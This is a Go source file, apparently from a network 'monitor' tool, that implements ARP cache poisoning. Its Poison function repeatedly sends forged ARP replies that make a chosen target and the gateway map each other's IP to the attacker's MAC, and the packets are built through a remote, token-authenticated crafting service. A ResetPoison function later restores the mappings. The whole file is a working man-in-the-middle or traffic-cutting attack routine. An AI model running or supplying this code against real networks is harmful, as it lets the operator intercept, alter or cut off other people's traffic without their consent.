package poison

import (
	"net"
	"netctrl.io/monitor/errors"
	"netctrl.io/monitor/networking/network"
	"netctrl.io/monitor/networking/remote"
	"time"

	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

/*
ARP spoof:
1: Send ARP packet posing as gateway IP to target (srcMAC=me, srcIP=gateway, dstMAC=target, dstIP=target)
2: Send ARP packet posing as target IP to gateway (srcMAC=me, srcIP=target, dstMAC=gateway, dstIP=gateway)
*/

func Poison(
	handle *pcap.Handle,
	jwt string,
	iface net.Interface,
	targetIP net.IP,
	targetMAC net.HardwareAddr,
	gatewayMAC net.HardwareAddr,
	gatewayIP net.IP,
	sleepDuration time.Duration,
	stop chan interface{},
) {
	// Create packets to send
	toRouterPacket, err := remote.CraftPacketRemotely(iface.HardwareAddr, gatewayIP, targetMAC, targetIP, layers.ARPReply, jwt)
	if err != nil {
		errors.HandleFatalError(err)
		return
	}
	toTargetPacket, err := remote.CraftPacketRemotely(iface.HardwareAddr, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
	if err != nil {
		errors.HandleFatalError(err)
		return
	}

	for {
		select {
		case <-stop:
			return
		default:
			// network.CraftAndSendArpPacket(handle, iface.HardwareAddr, gatewayIP, targetMAC, targetIP, layers.ARPReply)
			// network.CraftAndSendArpPacket(handle, iface.HardwareAddr, targetIP, gatewayMAC, gatewayIP, layers.ARPReply)
			network.SendPacket(handle, toRouterPacket)
			network.SendPacket(handle, toTargetPacket)
			time.Sleep(sleepDuration)
		}
	}
}

func ResetPoison(
	handle *pcap.Handle,
	targetIP net.IP,
	targetMAC net.HardwareAddr,
	gatewayMAC net.HardwareAddr,
	gatewayIP net.IP,
	jwt string,
) {
	resetRouterPacket, err := remote.CraftPacketRemotely(gatewayMAC, gatewayIP, targetMAC, targetIP, layers.ARPReply, jwt)
	if err != nil {
		errors.HandleFatalError(err)
		return
	}
	resetTargetPacket, err := remote.CraftPacketRemotely(targetMAC, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
	if err != nil {
		errors.HandleFatalError(err)
		return
	}

	// Sleep for two seconds so target can digest poison before resetting poison.
	// Do this three times.
	for i := 0; i < 3; i++ {
		time.Sleep(time.Second * 2)

		network.SendPacket(handle, resetRouterPacket)
		network.SendPacket(handle, resetTargetPacket)
		// network.CraftAndSendArpPacket(handle, gatewayMAC, gatewayIP, targetMAC, targetIP, layers.ARPReply)
		// network.CraftAndSendArpPacket(handle, targetMAC, targetIP, gatewayMAC, gatewayIP, layers.ARPReply)
	}
}
